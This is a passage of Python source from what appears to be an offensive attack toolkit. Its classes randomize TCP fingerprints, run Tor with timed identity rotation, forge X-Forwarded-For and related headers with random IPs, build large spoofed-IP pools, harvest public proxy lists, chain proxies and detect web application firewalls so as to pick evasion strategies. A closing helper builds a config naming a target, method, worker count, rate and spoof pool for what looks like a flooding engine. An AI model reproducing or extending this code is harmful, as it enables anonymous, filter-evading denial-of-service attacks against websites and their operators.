    def randomize(self) -> dict:
        os_name = random.choice(list(self.WINDOW_SIZES.keys()))
        base_window = self.WINDOW_SIZES[os_name]
        window = base_window + random.randint(-1024, 1024)
        ttl = random.choice([64, 128, 255]) + random.randint(-2, 2)
        ttl = max(1, min(255, ttl))
        return {
            "tcp_window": max(256, window),
            "ttl": ttl,
            "os_hint": os_name,
            "timestamp": random.randint(0, 2**32 - 1),
            "sack": random.choice([True, False]),
            "wscale": random.choice([0, 1, 2, 3, 4, 5, 6, 7, 8]),
        }


# ── TorManager ───────────────────────────────────────────────────────

class TorManager:
    def __init__(self, control_port: int = 9051, socks_port: int = 9050,
                 auto_rotate_interval: int = 0, exit_country: str = "",
                 data_dir: Optional[str] = None):
        self.process = None
        self.control_port = control_port
        self.socks_port = socks_port
        self.running = False
        self.auto_rotate_interval = auto_rotate_interval
        self.exit_country = exit_country
        self.data_dir = data_dir or str(HACKIT_DIR / "tor_data")
        self._rotate_thread = None
        self._stop_event = threading.Event()
        self._has_stem = False
        self._circuit_id_map: dict[str, int] = {}

    def _try_stem(self):
        try:
            import stem
            import stem.connection
            import stem.control
            self._has_stem = True
            return True
        except ImportError:
            self._has_stem = False
            return False

    def start(self) -> bool:
        try:
            full_args = [
                "tor",
                "--ControlPort", str(self.control_port),
                "--SOCKSPort", str(self.socks_port),
                "--DataDirectory", self.data_dir,
                "--RunAsDaemon", "0",
                "--Quiet",
            ]
            if self.exit_country:
                full_args.extend(["--ExitNodes", f"{{{self.exit_country}}}"])
                full_args.extend(["--GeoIPExcludeUnknown", "1"])
            os.makedirs(self.data_dir, exist_ok=True)
            self.process = subprocess.Popen(
                full_args,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            time.sleep(3)
            self.running = True
            if self.auto_rotate_interval > 0:
                self._start_auto_rotate()
            return True
        except FileNotFoundError:
            return False
        except Exception:
            return False

    def stop(self):
        self._stop_event.set()
        if self._rotate_thread and self._rotate_thread.is_alive():
            self._rotate_thread.join(timeout=3)
        if self.process:
            self.process.terminate()
            try:
                self.process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.process.kill()
                self.process.wait()
            self.running = False

    def new_identity(self) -> bool:
        if not self.running:
            return False
        if self._has_stem:
            return self._new_identity_stem()
        return self._new_identity_control()

    def _new_identity_stem(self) -> bool:
        try:
            import stem.connection
            import stem.control
            controller = stem.control.Controller.from_port(port=self.control_port)
            controller.authenticate()
            controller.signal("NEWNYM")
            controller.close()
            time.sleep(1)
            return True
        except Exception:
            return False

    def _new_identity_control(self) -> bool:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect(("127.0.0.1", self.control_port))
            s.send(b'AUTHENTICATE ""\r\n')
            s.recv(1024)
            s.send(b"SIGNAL NEWNYM\r\n")
            resp = s.recv(1024)
            s.close()
            time.sleep(1)
            return b"250" in resp
        except Exception:
            return False

    def _start_auto_rotate(self):
        self._stop_event.clear()

        def _rotate_loop():
            while not self._stop_event.is_set():
                self._stop_event.wait(self.auto_rotate_interval)
                if self._stop_event.is_set():
                    break
                self.new_identity()

        self._rotate_thread = threading.Thread(target=_rotate_loop, daemon=True)
        self._rotate_thread.start()

    def stream_isolation(self, target_host: str) -> dict:
        """Return SOCKS5 proxy settings for stream-isolated connection."""
        circuit_id = self._circuit_id_map.get(target_host, 0)
        if circuit_id == 0:
            circuit_id = random.randint(1, 1000)
            self._circuit_id_map[target_host] = circuit_id
        return {
            "socks_host": "127.0.0.1",
            "socks_port": self.socks_port,
            "circuit_id": circuit_id,
        }

    def get_proxy_url(self) -> str:
        return f"socks5://127.0.0.1:{self.socks_port}"


# ── MaskingEngine (backward-compatible enhanced) ─────────────────────

class MaskingEngine:
    def __init__(self):
        self.proxies: list[Proxy] = []
        self.current_proxy: Optional[Proxy] = None
        self.spoof_pool: list[str] = []
        self.lock = threading.Lock()
        self.ua_gen = RealisticUAGenerator()
        self.waf_detector = WAFDetector()
        self.fingerprint_randomizer = ConnectionFingerprintRandomizer()
        self.request_signer = RequestSigner()
        self.spoof_gen = SpoofIPGenerator()
        self.bandwidth = BandwidthMimic()
        self.doh_resolver = DohResolver()
        self.proxy_chains: list[ProxyChain] = []
        self._load_proxies()

    def _load_proxies(self):
        try:
            if PROXY_DB.exists():
                with open(PROXY_DB) as f:
                    data = json.load(f)
                    self.proxies = [Proxy.from_dict(p) for p in data]
        except Exception:
            self.proxies = []

    def _save_proxies(self):
        try:
            PROXY_DB.parent.mkdir(parents=True, exist_ok=True)
            with open(PROXY_DB, "w") as f:
                json.dump([p.to_dict() for p in self.proxies], f, indent=2)
        except Exception:
            pass

    def add_proxy(self, proxy_url: str):
        parsed = urlparse(proxy_url)
        scheme = parsed.scheme or "socks5"
        with self.lock:
            if not any(p.url == proxy_url for p in self.proxies):
                self.proxies.append(Proxy(url=proxy_url, protocol=scheme))
                self._save_proxies()

    def remove_proxy(self, proxy_url: str):
        with self.lock:
            self.proxies = [p for p in self.proxies if p.url != proxy_url]
            self._save_proxies()

    def random_ua(self) -> str:
        return self.ua_gen.random()

    def random_referer(self) -> str:
        return self.ua_gen.random_referer()

    def random_headers(self) -> dict:
        headers = self.ua_gen.random_headers()
        headers["Referer"] = self.ua_gen.random_referer()
        headers["Cache-Control"] = random.choice(["no-cache", "max-age=0"])
        headers["X-Forwarded-For"] = self.random_ip()
        headers["X-Real-IP"] = self.random_ip()
        headers["Forwarded"] = f"for={self.random_ip()};proto=http;by={self.random_ip()}"
        if random.random() < 0.3:
            headers["Upgrade-Insecure-Requests"] = "1"
        if random.random() < 0.2:
            headers["DNT"] = random.choice(["0", "1"])
        return headers

    def random_ip(self) -> str:
        return self.spoof_gen.random_ip()

    def generate_spoof_pool(self, count: int = 10000, country: Optional[str] = None) -> list[str]:
        pool = self.spoof_gen.generate_pool(count, country)
        self.spoof_pool = pool
        return pool

    def rotate_proxy(self, strategy: str = "weighted") -> Optional[str]:
        with self.lock:
            if not self.proxies:
                return None
            candidates = [p for p in self.proxies]
            if strategy == "random":
                chosen = random.choice(candidates)
            elif strategy == "best":
                candidates.sort(key=lambda p: p.score, reverse=True)
                chosen = candidates[0] if candidates else None
            else:
                weights = [max(p.score, 0.1) for p in candidates]
                total = sum(weights)
                if total <= 0:
                    chosen = random.choice(candidates)
                else:
                    r = random.uniform(0, total)
                    cumulative = 0
                    chosen = candidates[-1]
                    for p, w in zip(candidates, weights):
                        cumulative += w
                        if r <= cumulative:
                            chosen = p
                            break
            self.current_proxy = chosen
            return chosen.url if chosen else None

    def test_proxy(self, proxy_url: str, timeout: int = 5):
        try:
            import urllib.request
            proxy_handler = urllib.request.ProxyHandler(
                {"http": proxy_url, "https": proxy_url}
            )
            opener = urllib.request.build_opener(proxy_handler)
            start = time.time()
            resp = opener.open("http://httpbin.org/ip", timeout=timeout)
            latency = time.time() - start
            data = json.loads(resp.read().decode())
            return True, latency
        except Exception:
            return False, 0.0

    async def test_proxy_async(self, proxy_url: str, timeout: int = 5):
        try:
            import aiohttp
            connector = aiohttp.TCPConnector(limit=100)
            async with aiohttp.ClientSession(connector=connector) as session:
                start = time.time()
                async with session.get(
                    "http://httpbin.org/ip",
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=timeout),
                ) as resp:
                    latency = time.time() - start
                    await resp.json()
                    return True, latency
        except Exception:
            return False, 0.0

    async def validate_all_proxies_async(self, timeout: int = 5):
        tasks = []
        with self.lock:
            for proxy in self.proxies:
                tasks.append(self._validate_single(proxy, timeout))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        valid_count = sum(1 for r in results if r is True)
        return valid_count, len(tasks)

    async def _validate_single(self, proxy: Proxy, timeout: int) -> bool:
        try:
            import aiohttp
            connector = aiohttp.TCPConnector(limit=1000)
            async with aiohttp.ClientSession(connector=connector) as session:
                start = time.time()
                async with session.get(
                    "http://httpbin.org/ip",
                    proxy=proxy.url,
                    timeout=aiohttp.ClientTimeout(total=timeout),
                ) as resp:
                    latency = time.time() - start
                    data = await resp.json()
                    with self.lock:
                        proxy.speed = latency
                        proxy.reliability = min(1.0, proxy.reliability + 0.05)
                        proxy.successes += 1
                    return True
        except Exception:
            with self.lock:
                proxy.failures += 1
                proxy.reliability = max(0, proxy.reliability - 0.15)
            return False

    def detect_waf(self, target: str, timeout: int = 10) -> Optional[list[str]]:
        try:
            import urllib.request
            req = urllib.request.Request(
                f"http://{target}",
                headers={"User-Agent": self.random_ua()},
            )
            resp = urllib.request.urlopen(req, timeout=timeout)
            headers = dict(resp.headers)
            body = resp.read().decode("utf-8", errors="replace")
            server = headers.get("Server", "")
            return self.waf_detector.detect(headers, body, server)
        except Exception:
            return None

    def suggest_strategy(self, waf_name):
        if isinstance(waf_name, list):
            return self.waf_detector.suggest_strategy(waf_name)
        names = [waf_name] if waf_name else []
        return self.waf_detector.suggest_strategy(names)

    def detect_waf_detailed(self, target: str, timeout: int = 10) -> dict:
        result = {
            "target": target,
            "waf_detected": None,
            "all_signatures": [],
            "server_header": "",
            "status_code": 0,
            "error": None,
        }
        try:
            import urllib.request
            req = urllib.request.Request(
                f"http://{target}",
                headers={"User-Agent": self.random_ua()},
            )
            resp = urllib.request.urlopen(req, timeout=timeout)
            result["status_code"] = resp.status
            headers = dict(resp.headers)
            result["server_header"] = headers.get("Server", "")
            body = resp.read().decode("utf-8", errors="replace")
            detected = self.waf_detector.detect(headers, body, result["server_header"])
            result["waf_detected"] = detected if detected else None
            result["all_signatures"] = list(self.waf_detector.WAF_SIGNATURES.keys())
        except Exception as e:
            result["error"] = str(e)
        return result

    def fetch_proxies_from_sources(self):
        sources = [
            ("proxyscrape_http", "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all"),
            ("proxyscrape_socks4", "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all"),
            ("proxyscrape_socks5", "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all"),
            ("geonode", "https://proxylist.geonode.com/api/proxy-list?protocols=http%2Chttps%2Csocks4%2Csocks5&limit=200&page=1&sort_by=lastChecked&sort_type=desc"),
        ]
        total = 0
        for source_name, url in sources:
            try:
                import urllib.request
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                resp = urllib.request.urlopen(req, timeout=15)
                data = resp.read().decode().strip()
                if source_name == "geonode":
                    try:
                        geo_data = json.loads(data)
                        for item in geo_data.get("data", []):
                            ip = item.get("ip", "")
                            port = item.get("port", "")
                            proto = item.get("protocols", ["http"])[0]
                            if ip and port:
                                proxy_url = f"{proto}://{ip}:{port}"
                                with self.lock:
                                    if not any(p.url == proxy_url for p in self.proxies):
                                        self.proxies.append(Proxy(url=proxy_url, protocol=proto, source=source_name))
                                        total += 1
                    except json.JSONDecodeError:
                        pass
                else:
                    for line in data.splitlines():
                        line = line.strip()
                        if line and ":" in line:
                            proto_map = {"proxyscrape_http": "http", "proxyscrape_socks4": "socks4", "proxyscrape_socks5": "socks5"}
                            proto = proto_map.get(source_name, "http")
                            proxy_url = f"{proto}://{line}"
                            with self.lock:
                                if not any(p.url == proxy_url for p in self.proxies):
                                    self.proxies.append(Proxy(url=proxy_url, protocol=proto, source=source_name))
                                    total += 1
            except Exception:
                continue
        with self.lock:
            self._save_proxies()
        return total

    def create_proxy_chain(self, hops: list[str]) -> ProxyChain:
        chain = ProxyChain()
        for hop_url in hops:
            parsed = urlparse(hop_url)
            scheme = parsed.scheme or "socks5"
            chain.add_hop(Proxy(url=hop_url, protocol=scheme))
        with self.lock:
            self.proxy_chains.append(chain)
        return chain

    def resolve_doh(self, hostname: str) -> Optional[str]:
        return self.doh_resolver.resolve_with_fallback(hostname)

    def get_fingerprint(self) -> dict:
        return self.fingerprint_randomizer.randomize()

    def next_request_delay(self) -> float:
        return self.bandwidth.next_request_interval()


# ── Helper Functions (backward-compatible) ───────────────────────────

def build_go_config(target, port, method, workers, rate_limit, duration,
                    spoof_pool=None, proxy_list=None, jitter=0):
    return {
        "target": target,
        "port": port,
        "method": method,
        "workers": workers,
        "rate_limit": rate_limit,
        "duration": duration,
        "spoof_ip": spoof_pool[0] if spoof_pool else "",
        "spoof_pool": spoof_pool or [],
        "proxy_list": proxy_list or [],
        "jitter": jitter,
    }
